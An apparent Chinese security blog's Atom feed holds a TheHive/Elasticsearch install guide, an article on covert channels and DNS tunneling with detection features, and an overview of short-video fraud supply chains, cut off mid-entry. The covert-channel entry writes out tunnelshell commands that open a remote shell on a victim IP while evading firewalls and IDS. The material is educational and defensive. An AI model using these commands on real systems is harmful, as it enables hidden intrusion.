<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>生鱼忧患</title>
  
  <subtitle>网络安全&amp;软件开发</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-04-09T14:32:00.773Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>真小鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>&#39;威胁情报生产与共享平台-1&#39;</title>
    <link href="http://yoursite.com/2021/04/09/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%94%9F%E4%BA%A7%E4%B8%8E%E5%85%B1%E4%BA%AB%E5%B9%B3%E5%8F%B0-1-1/"/>
    <id>http://yoursite.com/2021/04/09/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%94%9F%E4%BA%A7%E4%B8%8E%E5%85%B1%E4%BA%AB%E5%B9%B3%E5%8F%B0-1-1/</id>
    <published>2021-04-09T14:32:00.000Z</published>
    <updated>2021-04-09T14:32:00.773Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>威胁情报生产与共享平台-binary安装Elasticsearch&amp;thehive</title>
    <link href="http://yoursite.com/2021/04/09/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%94%9F%E4%BA%A7%E4%B8%8E%E5%85%B1%E4%BA%AB%E5%B9%B3%E5%8F%B0-1/"/>
    <id>http://yoursite.com/2021/04/09/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%94%9F%E4%BA%A7%E4%B8%8E%E5%85%B1%E4%BA%AB%E5%B9%B3%E5%8F%B0-1/</id>
    <published>2021-04-09T13:45:19.000Z</published>
    <updated>2021-04-09T14:26:28.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装Elasticsearch"><a href="#安装Elasticsearch" class="headerlink" title="安装Elasticsearch"></a>安装Elasticsearch</h1><h2 id="1-更新软件包列表，安装Java8"><a href="#1-更新软件包列表，安装Java8" class="headerlink" title="1.更新软件包列表，安装Java8"></a>1.更新软件包列表，安装Java8</h2><p>Elasticsearch是基于Java构建的，需要至少Java8来运行它。只支持Oracle的Java和OpenJDK。</p><h2 id="2-安装Elasticsearch-package"><a href="#2-安装Elasticsearch-package" class="headerlink" title="2.安装Elasticsearch package"></a>2.安装Elasticsearch package</h2><h3 id="2-1-Debian，Ubuntu版本的安装"><a href="#2-1-Debian，Ubuntu版本的安装" class="headerlink" title="2.1 Debian，Ubuntu版本的安装"></a>2.1 Debian，Ubuntu版本的安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># PGP key installation</span><br><span class="line">sudo apt-key adv --keyserver hkp:&#x2F;&#x2F;keyserver.ubuntu.com:80 --recv-key D88E42B4</span><br><span class="line"># Alternative PGP key installation</span><br><span class="line"># wget -qO - https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;GPG-KEY-elasticsearch | sudo apt-key add -</span><br><span class="line"># Debian repository configuration</span><br><span class="line">echo &quot;deb https:&#x2F;&#x2F;artifacts.elastic.co&#x2F;packages&#x2F;7.x&#x2F;apt stable main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;elastic-7.x.list</span><br><span class="line"># Install https support for apt</span><br><span class="line">sudo apt install apt-transport-https</span><br><span class="line"># Elasticsearch installation</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install elasticsearch</span><br></pre></td></tr></table></figure><blockquote><p><em>默认情况下，<strong>Debian</strong>包不会启动该服务，以防止实例在没有进行适当配置的情况下意外加入集群。</em></p></blockquote><h3 id="2-2-配置"><a href="#2-2-配置" class="headerlink" title="2.2 配置"></a>2.2 配置</h3><p>如果Elasticsearch和thehive运行在同一个主机上(并且不在docker中)，编辑 /etc/elasticsearch/elasticsearch.yml 并且network.host参数为127.0.0.1。thehive使用动态脚本进行部分更新。因此，它们必须使用script.inline: true激活。</p><p>还需要设置集群名称(如hive)。线程池队列大小必须设置为一个很高的值(100000)。默认大小将使队列很容易重载。</p><p>编辑/etc/elasticsearch/elasticsearch.yml并且添加以下几行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.host: 127.0.0.1</span><br><span class="line">cluster.name: hive</span><br><span class="line">thread_pool.search.queue_size: 100000</span><br></pre></td></tr></table></figure><h2 id="3-开启服务"><a href="#3-开启服务" class="headerlink" title="3.开启服务"></a>3.开启服务</h2><p>现在Elasticsearch已经配置好了，将它作为一个服务启动，并检查它是否正在运行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable elasticsearch.service</span><br><span class="line">sudo systemctl start elasticsearch.service</span><br><span class="line">sudo systemctl status elasticsearch.service</span><br></pre></td></tr></table></figure><p>状态应该是active (running)。如果它没有运行，你可以在日志中检查原因:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl -u elasticsearch.service</span><br></pre></td></tr></table></figure><p>默认情况下，数据库存储在/var/lib/elasticsearch目录下，日志存储在/var/log/elasticsearch目录下。</p><h1 id="安装thehive"><a href="#安装thehive" class="headerlink" title="安装thehive"></a>安装thehive</h1><h2 id="1-更新软件包列表"><a href="#1-更新软件包列表" class="headerlink" title="1.更新软件包列表"></a>1.更新软件包列表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="2-安装包解压包"><a href="#2-安装包解压包" class="headerlink" title="2.安装包解压包"></a>2.安装包解压包</h2><p>下载并解压缩所选的二进制包。thehive文件可以安装在文件系统的任何位置。在本指南中，我们假设您选择将它们安装在/opt下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;opt</span><br><span class="line">wget https:&#x2F;&#x2F;dl.bintray.com&#x2F;thehive-project&#x2F;binary&#x2F;thehive-latest.zip</span><br><span class="line">unzip thehive-latest.zip</span><br><span class="line">ln -s thehive-x.x.x thehive</span><br></pre></td></tr></table></figure><h2 id="3-初次开始"><a href="#3-初次开始" class="headerlink" title="3.初次开始"></a>3.初次开始</h2><p>建议使用专用的非特权用户帐号启动thehive。如果是，请确保所选择的帐号可以在“/opt/thehive/logs”目录下创建日志文件。</p><h2 id="4-开启服务"><a href="#4-开启服务" class="headerlink" title="4.开启服务"></a>4.开启服务</h2><p>如果您希望以服务的形式启动应用程序，可以使用以下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo addgroup thehive</span><br><span class="line">sudo adduser --system thehive</span><br><span class="line">sudo cp &#x2F;opt&#x2F;thehive&#x2F;package&#x2F;thehive.service &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system</span><br><span class="line">sudo chown -R thehive:thehive &#x2F;opt&#x2F;thehive</span><br><span class="line">sudo chgrp thehive &#x2F;etc&#x2F;thehive&#x2F;application.conf</span><br></pre></td></tr></table></figure><blockquote><p><em>/etc<strong>文件夹下不会自动生成</strong>thehive<strong>，需要手动创建</strong>thehive<strong>文件夹，然后把</strong>/opt/thehive/conf<strong>文件夹下的</strong>application.sample<strong>文件复制到</strong>/etc/thehive<strong>中，重命名为</strong>application.conf**即可</em></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 640 &#x2F;etc&#x2F;thehive&#x2F;application.conf</span><br><span class="line">sudo systemctl enable thehive</span><br><span class="line">sudo service thehive start</span><br></pre></td></tr></table></figure><h2 id="5-生成密钥"><a href="#5-生成密钥" class="headerlink" title="5.生成密钥"></a>5.生成密钥</h2><p>为了启动thehive，唯一需要的参数是服务器的密钥(play.http.secret.key)。此密钥用于验证包含数据的cookie。当thehive运行在集群模式时，所有实例必须共享相同的密钥。您可以使用以下命令生成最小配置(假设您已经为thehive创建了一个专用用户，名为thehive):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir &#x2F;etc&#x2F;thehive</span><br><span class="line">(cat &lt;&lt; _EOF_</span><br><span class="line"># Secret key</span><br><span class="line"># ~~~~~</span><br><span class="line"># The secret key is used to secure cryptographics functions.</span><br><span class="line"># If you deploy your application to several instances be sure to use the same key!</span><br><span class="line">play.http.secret.key&#x3D;&quot;$(cat &#x2F;dev&#x2F;urandom | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 64 | head -n 1)&quot;</span><br><span class="line">_EOF_</span><br><span class="line">) | sudo tee -a &#x2F;etc&#x2F;thehive&#x2F;application.conf</span><br></pre></td></tr></table></figure><h2 id="6-建造thehive"><a href="#6-建造thehive" class="headerlink" title="6.建造thehive"></a>6.建造thehive</h2><p>现在你可以开始建造thehive了。将当前目录更改为TheHive安装目录(本指南中为/opt/thehive)，然后执行:<br>bin/thehive -Dconfig.file=/etc/thehive/application.conf<br>请注意，这项服务可能需要一段时间才能启动。一旦它启动，你可以启动你的浏览器并连接到<a href="http://YOUR_SERVER_ADDRESS:9000/.请注意，这项服务可能需要一段时间才能启动。" target="_blank" rel="noopener">http://YOUR_SERVER_ADDRESS:9000/.请注意，这项服务可能需要一段时间才能启动。</a></p><h2 id="7-第一次连接"><a href="#7-第一次连接" class="headerlink" title="7.第一次连接"></a>7.第一次连接</h2><p>第一次连接时，必须创建数据库模式。点击“Migrate database”，创建DB schema。<br>一旦完成，您应该被重定向到创建管理员帐户的页面。<br>创建之后，您应该被重定向到登录页面。<br>警告:在这个阶段，如果你错过了admin帐户的创建，你将无法做到，除非你从Elasticsearch中删除hive的索引。在这个错误的情况下，首先在hive使用的Elasticsearch DB所在的主机上运行以下命令来查找hive的当前索引:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:&#x2F;&#x2F;127.0.0.1:9200&#x2F;_cat&#x2F;indices?v</span><br></pre></td></tr></table></figure><p>thehive使用的索引总是以the_hive_开头，后面跟着一个数字。让我们假设这个命令的输出是:xxx<br>thehive使用的索引是the_hive_13。删除命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X DELETE http:&#x2F;&#x2F;127.0.0.1:9200&#x2F;the_hive_13</span><br></pre></td></tr></table></figure><p>然后重新加载页面或重新启动thehive。</p><h2 id="8-更新"><a href="#8-更新" class="headerlink" title="8.更新"></a>8.更新</h2><p>要从二进制文件中更新hive，只需停止该服务，下载最新的包，重建链接/opt/ TheHive并重新启动该服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service thehive stop</span><br><span class="line">cd &#x2F;opt</span><br><span class="line">wget https:&#x2F;&#x2F;download.thehive-project.org&#x2F;thehive-latest.zip</span><br><span class="line">unzip thehive-latest.zip</span><br><span class="line">rm &#x2F;opt&#x2F;thehive &amp;&amp; ln -s thehive-x.x.x thehive</span><br><span class="line">chown -R thehive:thehive &#x2F;opt&#x2F;thehive &#x2F;opt&#x2F;thehive-x.x.x</span><br><span class="line">service thehive start</span><br></pre></td></tr></table></figure><h1 id="关于版本"><a href="#关于版本" class="headerlink" title="关于版本"></a>关于版本</h1><p>OS version Ubuntu20.04</p><p>Es 6.8.10<br>Thehive 4.0.0-1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装Elasticsearch&quot;&gt;&lt;a href=&quot;#安装Elasticsearch&quot; class=&quot;headerlink&quot; title=&quot;安装Elasticsearch&quot;&gt;&lt;/a&gt;安装Elasticsearch&lt;/h1&gt;&lt;h2 id=&quot;1-更新软件包列表，安装J
      
    
    </summary>
    
    
    
      <category term="威胁情报平台" scheme="http://yoursite.com/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B9%B3%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>隐蔽信道</title>
    <link href="http://yoursite.com/2021/03/24/%E9%9A%90%E8%94%BD%E4%BF%A1%E9%81%93/"/>
    <id>http://yoursite.com/2021/03/24/%E9%9A%90%E8%94%BD%E4%BF%A1%E9%81%93/</id>
    <published>2021-03-24T13:19:15.000Z</published>
    <updated>2021-03-25T14:04:47.536Z</updated>
    
    <content type="html"><![CDATA[<h1 id="隐蔽信道"><a href="#隐蔽信道" class="headerlink" title="隐蔽信道"></a>隐蔽信道</h1><p>攻击者使用隐藏的网络来绕过防火墙和IDS的检测。</p><p>信道是一种通信模式，隐蔽信道即无法检测的网络通信。</p><p>通过秘密信道传输的流量，管理员无法检测到。</p><p>在隐蔽通信中，数据流是由未授权的第三方篡改的，而在加密通信中，它是不会隐藏两个终端间存在加密通信的事实。</p><p>隐蔽信道在数据传输时并不会发送加密的数据包，因此它很容易进行嗅探，网络管理员可以很轻易地执行数据损失和风险管理。</p><h1 id="隐蔽信道类型"><a href="#隐蔽信道类型" class="headerlink" title="隐蔽信道类型"></a>隐蔽信道类型</h1><p>存储隐蔽信道：通过修改“存储位置”进行通信，这将允许一个进程直接或间接写入存储位置，而且允许另外一个进程直接或间接读取存储位置。</p><p>时间隐蔽信道：发送者通过时域上调制使用资源（例如CPU）发送信息，接收者能够观测到并对信息进行解码。</p><h1 id="使用Tunnelshell进行隐蔽信道攻击"><a href="#使用Tunnelshell进行隐蔽信道攻击" class="headerlink" title="使用Tunnelshell进行隐蔽信道攻击"></a>使用Tunnelshell进行隐蔽信道攻击</h1><p>几乎任何协议都是可以用来进行隐蔽通信。不过绝大多数的隐蔽信道研究都是基于第三层(网络层)和第四层(传输层)的，如ICMP，IP和TCP协议。7层协议(应用层)如HTTP和DNS协议偶尔也会使用。这种机制传输信息是不会触发网络防火墙和IDS警报的，而且netstat也检测不到。</p><h1 id="什么是tunnelshell"><a href="#什么是tunnelshell" class="headerlink" title="什么是tunnelshell"></a>什么是tunnelshell</h1><p>Tunnelshell是一个用C语言编写的程序，适用于Linux用户，是以客户端-服务端的模式工作的。服务端打开一个/bin/sh shell，客户端可以通过虚拟隧道进行访问。它适用于多种协议，包括TCP，UDP，ICMP和RawIP。而且数据包还可以进行分段来绕过防火墙和IDS。</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>1.客户端执行sudo ./tunneld，为服务端开启一个通信信道。</p><p>默认情况下，它会发送分段数据包，然后在所有分段到达服务器后重新组合，以此来绕过防火墙和IDS。</p><p>2.要通过tunnelshell进行连接，服务端执行命令，这将会建立一个隐蔽信道来进行数据传输。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./tunnel -i &lt;session id (0-65535)&gt; -d &lt;delay in sending packets&gt; -s &lt;packet size&gt; -t &lt;tunnel type&gt; -o &lt;protocol&gt; -p &lt;port&gt; -m &lt;ICMP query&gt; -a &lt;ppp interface&gt; &lt;Victim’s IP&gt;</span><br><span class="line">./tunnel -t frag 10.10.10.2 #frag:使用IPv4分段数据包进行封装数据。</span><br></pre></td></tr></table></figure><p>3.如果使用netstat命令来检查网络状态，你看不到任何有关tunnelshell的进程ID。不过，通过ps命令（ps |grep .tunneld）是能够看到进程信息的，然后再通过netstat命令（netstat -ano）查看它的进程ID。</p><p>4.如果进行正确的监控的话，网络管理员是可以嗅探到数据包的。可使用wireshark观察捕获了的隐蔽的流量并且看到嗅探到了两个终端设备之间传输的数据。</p><h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><p>DNS隧道(DNS Tunneling)是将其他协议的内容封装在DNS协议中，然后以DNS请求和响应包完成传输数据(通信)的技术。防火墙和入侵检测设备出于可用性和用户友好的考虑将很难做到完全过滤掉DNS流量，因此，攻击者可以利用它实现远程控制，文件传输等操作。</p><h1 id="DNS隧道类型"><a href="#DNS隧道类型" class="headerlink" title="DNS隧道类型"></a>DNS隧道类型</h1><p>1.直连隧道：用户端直接和指定的目标DNS服务器建立连接，然后将需要传输的数据编码封装在DNS协议中进行通信。这种方式的优点是具有较高速度，但蔽性弱、易被探测追踪的缺点也很明显。另外直连方式的限制比较多，如目前很多的企业网络为了尽可能的降低遭受网络攻击的风险，一般将相关策略配置为仅允许与指定的可信任DNS服务器之间的流量通过。<br>2.中继隧道：通过DNS迭代查询而实现的中继DNS隧道，这种方式及其隐秘，且可在绝大部分场景下部署成功。但由于数据包到达目标DNS服务器前需要经过多个节点的跳转，数据传输速度和传输能力较直连会慢很多。</p><h2 id="DNS隐蔽隧道实现的要点"><a href="#DNS隐蔽隧道实现的要点" class="headerlink" title="DNS隐蔽隧道实现的要点"></a>DNS隐蔽隧道实现的要点</h2><p>1.DNS缓存机制的规避<br>在使用中继隧道时，如果需要解析的域名在本地的DNS Server中已经有缓存时，本地的DNS Server就不会转发数据包。所以在构造的请求中，每次查询的域名都是不一样的。</p><p>2.DNS载荷的编码</p><p>从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为2roAUSwVqwOWCaaDC.test.fish.com,其中2roAUSwVqwOWCaaDc则是客户端传递给服务器的信息，这串字符解码后的信息便是DNS隧道。</p><p>3.可利用DNS查询类型</p><p>DNS的记录类型有很多，常见的有A,AAAA,CNAME,MX,NS等。DNS隧道可以利用其中的一些记录类型来传输数据。例如A,MX,CNAME,TXT等。</p><p>4.主动连接</p><p>内网客户端位于防火墙后方，服务端无法做到主动连接，因此大多的dns隧道工具，客户端会定时向服务端发送请求，保证二者之间的通信状态。</p><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>dnscat2，iodine，DeNise，dns2tcp等单独的DNS隧道工具。</p><p>cs，msf，empire等集合了DNS隧道功能的安全工具。</p><ul><li>dns2tcp：支持直连模式的DNS隧道，只实现了简单的DNS隧道，相关命令和控制服务需要自行搭建，且已在kali系统中直接集成</li><li>iodine：最活跃、速度最快、支持直连和中继模式，且支持丰富的编码、请求类型选择</li><li>Dnscat2：封装在DNS协议中的加密C&amp;C信道，直接运行工具即可实现数据传输、文件操作等命令和控制功能</li></ul><h1 id="基于DNS隐蔽通信"><a href="#基于DNS隐蔽通信" class="headerlink" title="基于DNS隐蔽通信"></a>基于DNS隐蔽通信</h1><p>企业防火墙通常配置为允许UDP端口53（由DNS使用）上的所有数据包，即DNS流量通常允许通过企业防火墙而无需深度检查或状态维护。从攻击者的角度来看，这使得DNS协议成为数据泄露的隐蔽通信通道。</p><p>攻击者利用DNS的一种方法是注册域名（例如，fish2021.club），以便攻击者在主机受害者中的恶意软件可以将有价值的私人信息（例如信用卡号，登录密码或知识产权）编码为形式为arbitrary-string.fish2021.club的DNS请求。此DNS请求由全局域名系统中的解析器转发到fish2021.club域的权威服务器（在攻击者的控制下），后者又向主机受害者发送响应。这为攻击者在主受害者及其命令和控制中心之间提供了低速但隐蔽的双向通信信道。</p><h1 id="DNS检测"><a href="#DNS检测" class="headerlink" title="DNS检测"></a>DNS检测</h1><p>监控网络DNS活动和阻止可疑域是其中一种抵御技术。</p><p>对于分析DNS流量以识别恶意网络活动，有很多检测方法,比如使用字符频率分析的DNS隧道检测方法等。</p><p>对于任何组织用以对抗各种安全威胁来说，在企业级水平上的单点Bot检测至关重要。</p><p>DNS检测工具BotDAD，它是部署在企业的网络边界上进行单点Bot检测的，它通过观察主机在一段时间内的DNS指纹，尝试寻找域正常的主机行为相当不同的异常行为，从而识别受感染的主机。</p><p>以BotDAD为例进行DNS检测的技术分析。</p><h2 id="DNS检测特征"><a href="#DNS检测特征" class="headerlink" title="DNS检测特征"></a>DNS检测特征</h2><p>BotDAD中统计分析了15种DNS的行为特征,</p><table><thead><tr><th>序号</th><th>DNS特征</th><th>描述</th></tr></thead><tbody><tr><td>P1</td><td>每小时DNS请求的数量</td><td>受感染的僵尸主机每小时的请求数量往往高于正常主机。</td></tr><tr><td>P2</td><td>每小时不同的DNS请求数</td><td>感染DGA恶意软件的主机往往比普通主机具有更多不同的请求。</td></tr><tr><td>P3</td><td>单个域的最大请求数</td><td>帮助检测DNS隧道，敏感信息通过DNS协议传输。</td></tr><tr><td>P4</td><td>每分钟平均请求数</td><td>用于检测受恶意软件感染的计算机，该计算机不使用短暂的DNS请求，而是使用休眠间隔定期对DNS请求做出贡献。  它的计算方法是将主机发送的请求数除以主机处于活动状态并使用DNS服务的持续时间。</td></tr><tr><td>P5</td><td>每分钟最多请求数</td><td>帮助检测感染恶意软件的僵尸程序，这些恶意软件使用短暂的DNS请求通过域生成算法生成的多个URL与C&amp;  C服务器进行通信。</td></tr><tr><td>P6</td><td>MX记录查询数</td><td>是网络中基于垃圾邮件的僵尸网络的强有力指标。</td></tr><tr><td>P7</td><td>PTR记录(ip地址到域名的一条记录)查询数</td><td>有助于检测网络中存在异常行为的主机以及可能的感染。</td></tr><tr><td>P8</td><td>查询的不同DNS服务器的数量</td><td>有助于检测网络中具有异常行为的机器，因为标准系统查询多个DNS服务器的情况并不常见。  TLD: top  level domain,顶级域名  SLD:  second level domain,二级域名</td></tr><tr><td>P9</td><td>不同TLD请求的数量</td><td>在检测基于DGA的机器人方面非常有效，这些机器人不仅生成具有不同二级域的随机域，还生成具有不同顶级域名的随机域。</td></tr><tr><td>P10</td><td>不同SLD请求的数量</td><td>是网络中存在基于DGA的机器人的强烈指示。</td></tr><tr><td>P11</td><td>唯一性比率</td><td>是在主机每小时发送至少1000个请求的假设下，发送的请求数与发送的不同请求数之比。</td></tr><tr><td>P12</td><td>Failed/NXDOMAIN请求的数量</td><td>是网络中主机感染的一个非常强的指标。  它通过主机维护响应代码等于DNS_RCODE_NXDOMAIN的响应数。</td></tr><tr><td>P13</td><td>已解析IP地址的不同城市数量</td><td>是一个强烈的异常指标，尤其是当IP地址分布在各个城市时。  使用Maxmind数据库(“Geo2  Databases I MaxMi, 2017”) 获得城市映射的IP地址。</td></tr><tr><td>P14</td><td>已经解析的ip地址的不同国家数量</td><td></td></tr><tr><td>P15</td><td>Flux  ratio</td><td>在主机发送至少100个查询并且已收到至少100个响应的条件下，发送的不同请求与解析的不同p地址的比率。</td></tr></tbody></table><p>以基于DNS隐蔽信道的攻击与检测为例，目前基于网络流量的DNS检测技术，尤其是利用Passive DNS来实现对网络的DNS监控，不需要任何关于僵尸网络协议、通信或签名的先验知识，在当前的DNS检测领域具有一定的先进性和代表性。但基于DNS特征的检测技术也存在一些问题，一些数据特征可能具有时间和空间的特性，所以实验结果很可能具有偏向性，而这些不符合当前时空特性的数据特征就有被攻击者利用的可能性。</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>[1]隐蔽信道：隐形网络 <a href="https://www.sec-in.com/article/57" target="_blank" rel="noopener">https://www.sec-in.com/article/57</a></p><p>[2]基于DNS隐蔽信道的攻击与检测 <a href="https://cloud.tencent.com/developer/article/1490152" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1490152</a></p><p>[3]流量伪装 <a href="https://www.yuque.com/tidesec/redteam/wcnylf" target="_blank" rel="noopener">https://www.yuque.com/tidesec/redteam/wcnylf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;隐蔽信道&quot;&gt;&lt;a href=&quot;#隐蔽信道&quot; class=&quot;headerlink&quot; title=&quot;隐蔽信道&quot;&gt;&lt;/a&gt;隐蔽信道&lt;/h1&gt;&lt;p&gt;攻击者使用隐藏的网络来绕过防火墙和IDS的检测。&lt;/p&gt;
&lt;p&gt;信道是一种通信模式，隐蔽信道即无法检测的网络通信。&lt;/p&gt;

      
    
    </summary>
    
    
    
      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>短视频黑灰产</title>
    <link href="http://yoursite.com/2021/02/27/%E7%9F%AD%E8%A7%86%E9%A2%91%E9%BB%91%E7%81%B0%E4%BA%A7/"/>
    <id>http://yoursite.com/2021/02/27/%E7%9F%AD%E8%A7%86%E9%A2%91%E9%BB%91%E7%81%B0%E4%BA%A7/</id>
    <published>2021-02-27T09:10:05.000Z</published>
    <updated>2021-03-07T11:28:21.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="短视频行业"><a href="#短视频行业" class="headerlink" title="短视频行业"></a>短视频行业</h1><p><strong>互联网不变的主题：流量与变现。流量的抢夺和积累是变现的开始。</strong></p><p>短视频黑灰产利用到语音识别、OCR识别、自动化工具，甚至人工智能、神经网络等多种技术；涉及账号买卖、社工、诈骗、刷流量等多个环节。QQ群、微信群、淘宝等社群或平台成为国内短视频黑灰产扩张的根据地。</p><h1 id="短视频黑灰产业链"><a href="#短视频黑灰产业链" class="headerlink" title="短视频黑灰产业链"></a>短视频黑灰产业链</h1><h2 id="1-产业链概述"><a href="#1-产业链概述" class="headerlink" title="1.产业链概述"></a>1.产业链概述</h2><p>根据对短视频行业的分析，刷粉、刷量、工具软件销售等与短视频平台相关的牟利方式已经成为环环相扣的产业链。根据需求，服务一应俱全，从账号商人、工具开发者到代理IP平台、手机卡商、接码平台等，每一层都有成熟的利润获取方式。</p><p>与短视频平台直接相关的盈利行为有三种：搬运工薅羊毛、刷量作弊以及引流变现（三种都是下游产业）。</p><ul><li>搬运工薅羊毛：例如，当平台有补贴等鼓励活动时，采集其它平台优质视频，修改上传；有时搭配作弊冲击平台的各项指标，骗取现金奖励。</li><li>刷量作弊：刷粉、刷点赞、刷播放量等数据赚取现金。</li><li>引流变现：将短视频平台的用户（目标消费群体），引至微信等处，再以微商、诈骗等方式深度变现，多数为微商。</li></ul><p>整体短视频相关产业链的结构：</p><img src="/2021/02/27/%E7%9F%AD%E8%A7%86%E9%A2%91%E9%BB%91%E7%81%B0%E4%BA%A7/1.png" class title="This is an image"><h2 id="2-黑灰产名词"><a href="#2-黑灰产名词" class="headerlink" title="2.黑灰产名词"></a>2.黑灰产名词</h2><p>2.1 手机卡商，能够为接码平台和黑灰产从业者提供大量手机号，用以各种虚假注册、认证业务。这些手机卡我们称其为黑卡。</p><ol><li>卡源卡商通过各种渠道（如：开皮包公司、与代理商打通关系等）从运营商或代理商那里办理大量的手机卡，然后加价转卖给下游卡商赚取差价，他们掌握着手机黑卡货源。卡源主要有：<ol><li>物联网卡： 无须实名认证，主要用于工业、交通、物流等领域。物联网卡根据能否接听电话，分为短信卡（也称注册卡，只能收短信，给1069打头的服务号发短信）和语音卡（用以接收语音验证码和发送验证短信等业务）。</li><li>实名卡： 这种卡多为联络运营商后，从网上收集大量身份证信息批量认证得来。</li><li>海外卡： 由于实名制的原因，大量缅甸、越南、印尼等东南亚卡开始进入国内手机黑卡产业。这些卡支持GSM网络，国内可直接使用，无需实名认证，基本是0月租，收短信免费，非常切合黑产利益。</li></ol></li><li>猫池厂家负责生产猫池设备，并将设备卖给卡商使用。猫池是一种插上手机卡就可以模拟手机进行收发短信、接打电话、上网等功能的设备，在正常行业也有广泛应用， 如邮电局、银行、证券商、各类交易所、各类信息呼叫中心等。猫池设备可以实现对多张手机卡的管理。</li></ol><p>2.2 代理IP：用于网络攻击的IP，即黑IP。黑灰产从业者为了隐藏自己的真实IP，同时也为了绕过甲方的IP风控策略，需要大量的IP资源（比如代理IP）作为跳板，进而发动网络攻击。</p><p>2.3 接码平台负责连接卡商和羊毛党、号商等有手机验证码需求的群体，提供软件支持、业务结算等平台服务，通过业务分成获利。</p><p>2.4 羊毛党/号商/代理：</p><ol><li><p>当某个平台做营销活动时，羊毛党就会出动，大批量注册账号参与活动获取奖励。</p></li><li><p>号商则是大量注册并养各个平台的账号，通过出售账号获利。这些账号可以用于引流、刷量等后续业务。</p></li><li><p>代理则是通过网站、论坛、QQ群等多个渠道分发账号等资源，相当于黑中介。根据平台登录方式和账号种类，号码商一般销售三种账号：手机直登（用手机号直接注册的号码）、跳转号（采用第三方平台登录的方式，将其它平台的小号转换成短视频平台账号）、带某些属性的账号（如一定等级、特定权限等）。直登和跳转号多是使用群控系统、注册机等自动化工具批量注册。带属性的账号多为盗号等方式获得。</p><ol><li>群控系统的使用是为了避过平台对设备的检测。即采用电脑来控制多部移动设备， 